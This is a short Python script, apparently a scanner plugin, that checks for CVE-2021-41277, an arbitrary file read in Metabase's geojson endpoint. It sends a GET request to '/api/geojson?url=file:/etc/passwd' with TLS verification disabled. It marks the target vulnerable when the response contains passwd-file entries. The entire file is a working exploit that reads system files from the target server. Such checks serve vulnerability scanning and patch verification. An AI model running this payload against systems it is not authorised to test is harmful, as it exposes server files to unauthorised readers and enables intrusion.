#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Metabase geojson 任意文件读取漏洞 CVE-2021-41277',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/geojson?url=file:/etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret